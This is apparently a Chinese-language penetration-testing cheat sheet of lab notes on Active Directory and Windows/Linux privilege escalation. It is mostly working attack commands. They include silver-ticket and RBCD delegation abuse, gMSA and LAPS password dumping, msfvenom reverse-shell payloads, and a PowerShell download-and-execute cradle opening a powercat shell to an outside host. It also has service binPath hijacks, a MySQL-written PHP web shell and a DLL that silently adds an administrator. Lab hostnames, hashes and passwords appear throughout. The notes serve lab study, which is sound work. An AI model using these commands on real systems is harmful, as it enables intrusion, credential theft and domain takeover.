在安装 Active Directory (AD) 时，系统会自动创建一个 **域管理员账户**（`<域名>\Administrator`），例如 `CONTOSO\Administrator`。这个账户是域的最高管理员，可以管理整个 AD 域（如创建用户、组策略、管理其他域成员服务器等），而本地 `Administrator` 只能管理这一台域控制器（但通常不再需要用它）。它们的密码是独立的，除非你手动修改成相同的。

域 `Administrator` 账户极其重要，建议重命名并设置强密码（默认名称容易被攻击）。尽量避免直接使用域 `Administrator`，而是通过 **委派权限** 或 **使用域管理员组（Domain Admins）的其他账户** 管理。



# Windows High Privilege Groups

## Server Operators

存在这个组的用户使用Winpeas会发现，当前用户环境可写入一些与服务相关的注册表项，但不能随意写入所有注册表。

提权利用方式以VMTools服务为例：

```
sc.exe config VMTools binPath="C:\Users\<Username>\Desktop\shell.exe"

# Start the listener and then Stop/Start the service
sc.exe stop VMTools
sc.exe start VMTools
```



# Windows High Privilege Accounts

利用windows高权限服务账户完成本地提权：

https://itm4n.github.io/localservice-privileges/?ref=benheater.com

## LocalService

获取nt authority\local service身份后，发现没有SeImpersonate，可使用[FullPowers.exe](https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe)重新恢复该特权。如果能往C:\windows\system32写入文件，还可以尝试windows特权文件提权。



# SYSVOL

https://www.cnblogs.com/suv789/p/18284995



# Strings

一个简单可用的二进制''逆向"工具

```
strings -e l ResetPassword.exe 

-e l : 指定字符串的字符编码为16位小端序（Unicode/UTF-16）。适用于Windows PE文件（如 .exe、.dll），因为 Windows 程序通常使用 Unicode 字符串。
```



# Impacket-mssqlclient

## Kerberos票据登录

有时候权限的执行方式与 Kerberos 身份验证的工作方式会出现不匹配问题。特别是在伪造银票时，攻击者在 Kerberos 身份验证级别模拟了svc_mssql 服务帐户。在 MSSQL 环境中，此帐户可能（通常是错误地）配置了更高权限或 sysadmin 权限，尤其是在它是用于运行 SQL Server 服务的帐户的情况下。如果设置是为了方便起见，或者使用了默认配置，则通常会出现这种情况： *当您向服务提供有效的 Kerberos 票证（即使是伪造的）时，该服务会假定您就是票证上所标识的身份。它依靠 Kerberos 协议来正确完成其工作。如果您伪造了一张白银票证并声称自己是* `**svc_mssql**` *，那么从 SQL Server 的角度来看，您就是* svc_mssql。**那么伪造一张administartor的白银票据，服务就会给分配一个administrator才拥有的访问权限，当然登录mssql后您的身份显示还是svc_mssql，但是权限更大了。**

```
# 获取域SID
Get-AdDomain

# 获取SPN账户的密码NT哈希
https://codebeautify.org/ntlm-hash-generator

# 获取MSSQL服务SPN名称
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames


# 制作银票（获得一个服务账户后可尝试模拟用户administrator）
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator

impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator


# 导出票证
export KRB5CCNAME=$PWD/Administrator.ccache

# 检查是否正确保存
klist

# 使用-k选项，进行票据登录
Impacket-mssqlclient -k nagoya.nagoya-industries.com

# 启用xp_cmdshell
enable_xp_cmdshell
xp_cmdshell whoami
```

配置krb5文件，方便使用票据连接

```
sudo vim /etc/krb5user.conf

[libdefaults]  
        default_realm = NAGOYA-INDUSTRIES.COM  
        kdc_timesync = 1  
        ccache_type = 4  
        forwardable = true  
        proxiable = true  
    rdns = false  
    dns_canonicalize_hostname = false  
        fcc-mit-ticketflags = true  
  
[realms]          
        NAGOYA-INDUSTRIES.COM = {  
                kdc = nagoya.nagoya-industries.com  
        }  
  
[domain_realm]  
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

## 密码登录

有时候密码登录mssql也许用不了xp_cmdshell等功能！

```
impacket-mssqlclient svc_mssql:'Service1'@127.0.0.1 -windows-auth
```



# Resource-Based Constrained Delegation

用户l.livingstone对Resourcedc.resourced.local这台域控机器拥有修改`msDS-AllowedToActOnBehalfOfOtherIdentity`的权限。

```
# 如果攻击者没有控制设置了SPN的帐户，则可使用Impacket的addcomputer.py脚本添加新的攻击者控制的计算机帐户
impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 192.168.210.175 -domain-netbios resourced.local 'resourced.local/l.livingstone' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808'

# 配置目标对象，以便攻击者控制的计算机可以委托给它（指的是ATTACKERSYSTEM$）
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced.local/l.livingstone' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' -dc-ip 192.168.210.175

# 获取想要伪装为管理员的服务名称 (sname) 的服务票证
impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate 'Administrator' 'resourced.local/attackersystem$:Summer2018!' -dc-ip 192.168.210.175

export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

impacket-psexec resourcedc.resourced.local -target-ip 192.168.210.175 -k -no-pass
```

RBCD学习链接：

https://www.cnblogs.com/seizer/p/18003119

https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd

RBCD不同的利用方式：

https://www.youtube.com/watch?v=xMTCZt5DRB0

https://www.twitch.tv/videos/2250141344

addcomputer利用方式：

https://tools.thehacker.recipes/impacket/examples/addcomputer.py



# Rustscan

```bash
sudo rustscan --addresses 192.168.231.165 --ulimit 5000 -- -A -sC -Pn -sV -T 1500

sudo grc rustscan --ulimit 5000 -a 192.168.106.65 |tee rustscan.txt

grc : "Generic Colouriser" 的缩写，它是一个命令行工具，用于为各种命令的输出添加颜色和高亮，提高可读性。

sudo rustscan -a 192.168.156.45 -- -sV -oN nmap.txt
```



# GMSA

**Group Managed Service Accounts (gMSA)** 是微软推出的一种特殊类型的**服务账户**，其密码和权限通过安全组进行自动化管理。gMSA主要用于自动化管理密码、简化服务主体名称（SPN）管理，并提升安全性。例如：你可以创建一个 gMSA 账户 gmsa-sql$，然后授权给安全组 SQL-Servers-Group，组内的所有成员服务器都能使用该账户运行服务。gMSA 的密码由 AD 自动生成、轮换（默认30天一次），但账户本身需要管理员手动创建（通过 PowerShell 或 AD 管理工具）。

## ReadGMSAPassword

当控制一个在目标gMSA账户的msDS-GroupMSAMembership属性的DACL中列出的具有足够权限的对象时，这种滥用行为可以发生。通常，这些对象是已配置为明确允许使用 gMSA 帐户的主体。有关ReadGMSAPassword的滥用一般可以被bloodhound查出来。

```
# 加载powerview.ps1
. .\PowerView.ps1

# 确认svc_apache服务帐户是组托管服务帐户
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

# 查找哪些组有权限检索svc_apache服务帐户的密码的信息。
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,PrincipalsAllowedToRetrieveManagedPassword
```

### gMSADumper

列出谁可以读取任何 gMSA 密码 blob，并在当前用户有权访问时对其进行解析。

```
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'

python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
```

### bloodyAD

只能读取msDS-ManagedPassword属性值。

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword

bloodyAD --host 10.129.189.93 -d tombwatcher.htb -u alfred -p basketball get object ansible_dev$ --attr msDS-ManagedPassword
```

### GMSAPasswordReader

https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe

### Ldeep

```
ldeep ldap -d "tombwatcher.htb" -s "10.129.189.93" -u "alfred" -p "basketball" gmsa -t ansible_dev$
```

其它利用方式参考以下链接：

https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword



# Msfvenom

Generates Alphanumeric Shellcode：https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.219 LPORT=80 -f exe -o shell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.219 LPORT=80 --platform Windows -a x64 -f aspx -o shell.aspx

msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.205 LPORT=4444 -f war > shell.war

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.205 LPORT=80 EXITFUNC=thread  -f python

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR tun0 IP> LPORT=139 -f dll > phoneinfo.dll

msfvenom -p linux/x64/shell_reverse_tcp RHOST=192.168.49.196 LPORT=2222 -f elf -o run-parts

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=445 -f msi > notavirus.msi

# 应用程序是32位的，所劫持的dll也应该是32位
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.205 LPORT=80 -f dll -a x86 --platform windows -e x86/xor_dynamic -b '\x00' -o 0xBEN_privesc.dll

# 生成32位的reverse shell利用方式的shellcode，-b选项后跟badchar，一般漏洞代码会提供的坏字符串，该shellcode一般用于缓冲区溢出的利用代码。注意，alpha_mixed是数字和字符混合类型的，用于让绕过字符过滤。
msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.49.60 LPORT=4444 -e x86/alpha_mixed -f c
```



# LAPS 

LAPS（本地管理员密码解决方案） 是微软推出的一款免费工具，用于 自动化管理域中计算机的本地管理员账户密码。它解决了企业环境中所有计算机使用相同本地管理员密码导致的安全风险（如横向渗透攻击）。

## ReadLAPSPassword

该权限可以读取主机的本地管理员密码，如果主机是域控，那就是读取域管理员的密码。一般该权限的滥用可以被bloodhound监测到。

### Crackmapexec

使用 crackmapexec 转储 LAPS 密码

```
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```



# MSSQL

常规渗透测试步骤参考链接：

https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI

https://y4er.com/posts/mssql-getshell/

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet.md

https://github.com/InfoSecWarrior/Offensive-Enumeration/blob/main/MSSQL/README.md

https://www.hackingarticles.in/mssql-for-pentester-netexec/

https://github.com/Ignitetechnologies/MSSQL-Pentest-Cheatsheet?tab=readme-ov-file

```
# 查库
SELECT name FROM master.dbo.sysdatabases

# 寻找可模拟的用户
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

# 登录可模拟的用户并切换到hrappdb中查询表sysauth的字段值
EXECUTE AS LOGIN = 'hrappdb-reader'
use hrappdb
SELECT table_name FROM hrappdb.INFORMATION_SCHEMA.TABLES
select * from sysauth;
```



# MySQL

常规渗透测试步骤参考链接：

https://hackviser.com/tactics/pentesting/services/mysql

## Login Commands

```
mysql -h 192.168.226.186 -u BitForgeAdmin -p - skip-ssl
```

## Operate Commands

```
UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';
```

## Executing Commands via SQL Read & Write Operations

`load_file` 功能允许从服务器的文件系统中读取文件的内容。

`INTO OUTFILE` 子句允许将数据写入文件。

```sql
# 首先检查是否有加载文件的权限
select load_file('C:\\users\\public\\chisel.exe');

# 在同一目录下将其他方式上传的ncat.exe复制为nc.exe，如果使用icacls nc.exe发现administrator，说明存在越权，可使用特权文件提权。
select load_file('C:\\xampp\\htdocs\\ncat.exe') into dumpfile 'C:\\xampp\\htdocs\\nc.exe';

# 常见特权文件写入提权，则是使用工具WerTrigger，注意phoneinfo.dll可使用msfvenom自定义生成
select load_file('C:\\xampp\\htdocs\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';
select load_file('C:\\xampp\\htdocs\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';
select load_file('C:\\xampp\\htdocs\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';

# 读取flag值的步骤如下，
use mysql;
create table foo(line blob);
insert into foo values(load_file('c://users/administrator//desktop//proof.txt'));
select * from 'foo';

line : 表中的列名（字段名）
blob : 该列的数据类型，表示二进制大对象(Binary Large Object)

# 在 Web 服务器的根目录中创建一个 shell.php 文件
SELECT 1,2,"<?php echo shell_exec($_GET['command']);?>",4,5 INTO OUTFILE '/var/www/html/shell.php'
```

## UDF提权

https://www.cnblogs.com/candada/p/17764976.html



# Accesschk

accesschk.exe属于Sysinternals 工具箱，用于检查用户或组对系统资源的访问权限。

```
# 检查用户molly.smith对哪些服务有写入权限，这一步通常可以由winpeas完成。
accesschk.exe -cuwqv "molly.smith" * /accepteula

# 检查用户molly.smith对服务AppReadiness的权限
accesschk.exe -cuwqv "molly.smith" AppReadiness

# 哪些Windows服务是通过LocalSystem、NetworkService、LocalService账户运行的
accesschk.exe -accepteula -quv -c * | findstr /i "LocalSystem"

-c	检查 Windows 服务 的权限。
-u	直接显示用户名（而非 SID）。
-w	仅显示 具有写权限（Write） 的对象。
-q	安静模式（不显示启动横幅）。
-v	详细输出（显示更多信息，如权限类型）。
"molly.smith"	目标用户名（或组名），检查该账户的权限。
*	检查 所有对象类型（服务、文件、注册表等）。
/accepteula	自动接受 EULA（避免首次运行时弹出许可协议提示）。

# 查看服务详细信息，包括bitpath。
sc qc AppReadiness

# 修改bitpath
sc config AppReadiness binPath= "cmd /c net localgroup Administrators molly.smith /add"

# 停止服务
sc stop AppReadiness
net stop AppReadiness

# 启动服务
sc start AppReadiness
net start AppReadiness

# 重启服务
Restart-Service AppReadiness
```



# PowerCat

```
# 利用powershell在内存中下载文件并执行
Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 4444 -e cmd

# # 利用certutil下载文件
certutil -urlcache -split -f http://192.168.49.211/powercat.ps1
```



# Ldeep

深入 ldap 枚举的实用[程序](https://github.com/franc-pentest/ldeep/releases/download/1.0.86/ldeep_linux-amd64)。

```bash
# 将用户tracy.white添加至组Remote Access中
ldeep ldap -u tracy.white -p 'zgwj41FGx' -d nara-security.com -s ldap://mara-security.com add_to_group "CN=TRACY WHITE,OU=STAF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
```



# Ldapmodify

将用户tracy.white添加至组Remote Access中

```bash
ldapmodify -x -D "Tracy.White@nara-security.com" -w zqwj041FGX -H ldap://nara-security.com -f groupadd.ldif modifying entry "CN=Remote Access,OU=remote,DC=nara-security,DC=com"
```

groupadd.ldif内容如下，

```bash
dn: CN=Remote Access,OU=remote,DC=nara-security,DC=com
changetype: modify
add: member
member: CN=Tracy White,OU=staff,DC=nara-security,DC=com
```

尝试将用户administrator添加至OU ADCS中

```bash
ldapmodify -x -H ldap://10.129.116.183 -D "CN=john,CN=Users,DC=tombwatcher,DC=htb" -w 'P@ssw0rd456!' -f move_admin.ldif
```

move_admin.ldif 的内容如下，

```bash
dn: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
changetype: modrdn
newrdn: CN=Administrator
deleteoldrdn: 1
newsuperior: OU=ADCS,DC=tombwatcher,DC=htb
```



# Net

## Kali

```bash
# 将用户tracy.white添加至组Remote Access中
net rpc group addmem "Remote Access" "tracy.white" -U "tracy.white%zqwj041FGX" -S 192.168.164.30

# 将用户添加至组infrastructure中
net rpc group addmem "infrastructure" "alfred" -U "alfred%basketball" -S 10.129.192.165
net rpc group addmem "Infrastructure" "alfred" -U "tombwatcher.htb"/"Alfred"%"basketball" -S "dc01.tombwatcher.htb"

# 验证用户是否加入目标组中
net rpc group members "Infrastructure" -U "tombwatcher.htb"/"Alfred"%"basketball" -S "dc01.tombwatcher.htb"

# 修改用户密码
pth-net rpc password "sam" "newP@ssword2025" -U "tombwatcher.htb"/"ANSIBLE_DEV$"%"":"1c37d00093dc2a5f25176bf2d474afdc" -S "dc01.tombwatcher.htb"
```



# Wget

```
# 递归下载 FTP 服务器上的所有文件
wget -r ftp://Anonymous:Anonymous@192.168.164.30
wget -m --no-passive ftp://anonymous:anonymous@192.168.106.65
wget -m -c -w 2 --no-passive ftp://anonymous:anonymous@192.168.106.65

--no-passive : 强制使用主动模式（Active FTP），默认是被动模式 （Passive FTP）。
-m（或 --mirror）: 递归下载整个目录结构（类似 -r -N -l inf）。
-r : 进行递归下载文件并创建一个新目录存储这些文件。
-c : 断点续传。
-w : 等待时间。
```



# FTP

| 模式                             | 特点                                                     | 适用场景                    |
| :------------------------------- | :------------------------------------------------------- | :-------------------------- |
| **主动模式 (Active FTP)**        | FTP 服务器主动连接客户端的数据端口（可能被防火墙拦截）。 | 旧式 FTP 服务器，内网环境。 |
| **被动模式 (Passive FTP, 默认)** | 客户端连接服务器的数据端口（更兼容现代防火墙/NAT）。     | 大多数现代 FTP 服务器。     |

```
# ftp命令，下载当前目录的所有文件到本地
mget *
```



# Whatweb

网站指纹识别

```bash
whatweb -v -a3 — log-verbose whatweb.txt 192.168.106.65:80
```



# JuicyPotato

64位：https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

32位：https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe

JuicyPotato Windows CLSID：https://ohpe.it/juicy-potato/CLSID/



# Curl

```bash
# 通过添加header头部字段Authorization完成401认证
curl -X GET http://192.168.177.46:242/ -H "Authorization: Basic b2Zmc2VjOmVsaXRl"

# 使用http://offsec:elite@的方式完成401认证
curl -v http://offsec:elite@192.168.177.46:242/simple-backdoor.php

# 使用--data-urlencode代替直接使用get参数的方式
curl -v --data-urlencode "cmd=dir /a" http://offsec:elite@192.168.177.46:242/simple-backdoor.php

# 使用代理访问web页面，考试出现代理应用尝试直接使用，不考虑身份验证问题。
curl --proxy http://10.10.11.10:3128 http://10.10.11.10
curl -i --proxy http://10.10.11.10:3128 http://10.10.11.10
```



# .odt

## CVE-2018-10583

通过恶意 ODT 文件窃取 NTLM 凭据，相关文档可参考[链接](https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/)，利用代码可参考如下链接：

https://github.com/lof1sec/Bad-ODF?tab=readme-ov-file

https://github.com/rmdavy/badodf/

https://www.exploit-db.com/exploits/44564



# Windows Privileged File Escalation

特权文件提权，一般又分为写入和删除，具体可参考如下链接：

https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop---privileged-file-write

## WerTrigger

[WerTrigger](https://github.com/sailay1996/WerTrigger)中的phoneinfo.dll建议使用msfvenom重新生成个reverseshell类型的，默认只适用于GUI。

利用步骤如下，非常适合特权文件写入的场景：

```
1、以管理员身份 ，将 phoneinfo.dll 复制到 C：\Windows\System32\
2、将 Report.wer 文件和 WerTrigger.exe 放在同一目录中。
3、然后，运行 WerTrigger.exe。
```



# GodPotato

使用godpotato一定要注意.NET的版本，如果是 .NET 4.0 版，目标靶机就要使用GodPotato-NET4.exe。

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
```



# WriteOwner

具体有关该DACL的滥用参考：https://www.hackingarticles.in/abusing-ad-dacl-writeowner/

## Impacket-owneredit

```
# 该工具直接使用有转义报错，可添加2>/dev/null美化输出。
impacket-owneredit -action write -new-owner 'sam' -target-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'sam':'Password123!' -dc-ip 10.129.116.183 2>/dev/null
```

## Impacket-dacledit

```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Password123!'
```



# Abuse Control Of The OU

https://labs.withsecure.com/publications/ou-having-a-laugh

https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory

## Impacket-owneredit

```
impacket-owneredit -action write -new-owner 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'P@ssw0rd456!' -dc-ip 10.129.116.183 2>/dev/null
```

## Impacket-dacledit

```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'P@ssw0rd456!' 2>/dev/null

impacket-dacledit -action 'read' -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'P@ssw0rd456!' 2>/dev/null
```



# Metasploit

https://www.offsec.com/metasploit-unleashed/



# Spose

[Spose](https://github.com/aancw/spose?ref=benheater.com)是一个专门针对[Squid](https://www.squid-cache.org/)的Pivoting开放端口扫描器。



# PsMapExec

https://github.com/The-Viper-One/PsMapExec



# Planting SSH keys

植入恶意 SSH 密钥以获取对 Linux 机器的访问权限，具体步骤可参考[链接](https://medium.com/@vivek-kumar/planting-malicious-ssh-keys-to-gain-access-into-linux-boxes-e4a6fe3a1458)。



# Linux High Privilege Groups

## Disk Group

https://www.hackingarticles.in/disk-group-privilege-escalation/



# Covenant

[Covenant](https://github.com/cobbr/Covenant) 是红队成员的协作 .NET C2 框架。



# PowerUpSQL

https://github.com/NetSPI/PowerUpSQL



# 7z

```
# 7z 命令
解压：
7z x troubleshooting.7z
压缩文件：
7z a -t7z archive.7z 目标文件
压缩目录：
7z a -t7z 文件名.7z example\ -r

# md5sum命令校验7z文件md5hash值
md5sum test.7z
0e8777a1feb8a0c8e4115b7570d7355c  test.7z

# md5sum 校验文件checksum.txt中test.7z对应的md5 hash 是否正确
md5sum -c checksum.txt
test.7z: OK

# md5sum 校验如果错误
md5sum -c checksum.txt
test.7z: FAILED
md5sum: WARNING: 1 computed checksum did NOT match

# checksum.txt 中一般的格式
cat checksum.txt            
0e8777a1feb8a0c8e4115b7570d7355c  test.7z
```



# Neo-reGeorg

https://github.com/L-codes/Neo-reGeorg



# Suo5

https://github.com/zema1/suo5



# DnSpy

https://github.com/dnSpy/dnSpy



# x86_64-w64-mingw64-gcc

在kali平台编译用于64位dll劫持的dll文件

```
x86_64-w64-mingw64-gcc myDLL.cpp --shared -o myDLL.dll 
```

myDLL.cpp 内容如下，

```cpp
#include <stdlib.h> 
#include <windows.h> 
 
BOOL APIENTRY DllMain( 
HANDLE hModule,// Handle to DLL module 
DWORD ul_reason_for_call,// Reason for calling function 
LPVOID lpReserved ) // Reserved 
{ 
    switch ( ul_reason_for_call ) 
    { 
        case DLL_PROCESS_ATTACH: // A process is loading the DLL. 
        int i; 
        i = system ("net user dave2 password123! /add"); 
        i = system ("net localgroup administrators dave2 /add"); 
        break; 
        case DLL_THREAD_ATTACH: // A process is creating a new thread. 
        break; 
        case DLL_THREAD_DETACH: // A thread exits normally. 
        break; 
        case DLL_PROCESS_DETACH: // A process unloads the DLL. 
        break; 
    } 
    return TRUE; 
} 
```



# Fuxploider

文件上传漏洞扫描器，与upload_bypass类似

https://github.com/almandin/fuxploider



# PHP filter chain generator

文件包含结合php伪协议使用造成RCE

https://github.com/synacktiv/php_filter_chain_generator



# Ubuntu 20.04

通过如下命令临时设置代理环境变量，`sudo apt update`能够走代理。

```
sudo http_proxy="http://192.168.81.1:7890" https_proxy="http://192.168.81.1:7890" apt update
```



# Penelope

[Penelope](https://github.com/brightio/penelope) 是一个强大的 shell 处理程序，旨在简化、加速和优化后期开发工作流程。

推荐安装命令

```
pipx install git+https://github.com/brightio/penelope
```

常见使用命令

```
sudo penelope.py 80
```



# JWT

常见渗透利用：

https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key

## hashcat爆破签名密钥

```
# 通用大字典
hashcat -a 0 -m 16500 ./lele.jwt /usr/share/wordlists/rockyou.txt

# seclists里的默认密钥字典
hashcat -a 0 -m 16500 ./lele.jwt /usr/share/seclists/Passwords/scraped-JWT-secrets.txt

# 字典简单变形
hashcat -a 0 -m 16500 ./lele.jwt /usr/share/seclists/Passwords/scraped-JWT-secrets.txt -r /usr/share/hashcat/rules/best64.rule --force
```

